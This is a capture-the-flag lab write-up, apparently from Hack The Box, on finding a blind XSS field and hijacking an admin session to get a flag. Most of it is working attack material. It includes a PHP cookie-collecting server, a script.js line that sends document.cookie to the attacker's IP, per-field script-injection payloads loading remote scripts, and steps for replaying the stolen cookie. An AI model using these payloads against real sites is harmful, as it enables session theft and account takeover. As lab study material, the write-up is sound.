# HTB XSS and Session Hijacking Writeup

This repository documents identifying a vulnerable input field via XSS and performing session hijacking to steal the admin's cookie and retrieve the flag from `login.php`.

- **Attacker IP:** `10.10.14.179`
- **Target IP:** `10.129.31.89`
- **Date:** April 11, 2025

## Steps

### 1. Set Up Attacker Server
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
```
**index.php** 
```bash
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
**script.js**
```bash
new Image().src='http://10.10.14.179/index.php?c='+document.cookie;
```
**cookies.txt**
```bash
sudo touch cookies.txt
sudo chmod 666 cookies.txt
```
**Run server**
```bash
sudo php -S 0.0.0.0:80
```
### 2. Identify Vulnerable Field
**Form**: ` http://10.129.31.89/hijacking/index.php`

**Fields Tested:**

fullname: ` "><script src=http://10.10.14.179/fullname></script> `

username: ` "><script src=http://10.10.14.179/username></script> `

password: ` "><script src=http://10.10.14.179/password></script> `

email: ` "><script src=http://10.10.14.179/email></script> `

imgurl: ` "><script src=http://10.10.14.179/imgurl></script> `

**Process:**

Injected each payload into one field at a time, others set to **test**.

Checked server logs for requests (e.g., GET /fullname).

Vulnerable field identified when a request appeared.

### 3. Exploit with XSS
**Payload**: 

```bash ">
<script src=http://10.10.14.179/script.js></script>
```

Inject this script into the vulnerable field

**Cookie Captured**:
```bash
cat cookies.txt
```

### 4. Use Cookie in login.php
URL: ` http://10.129.31.89/hijacking/login.php `

Added cookie via DevTools > Storage > Cookies.

Refreshed to get the flag.


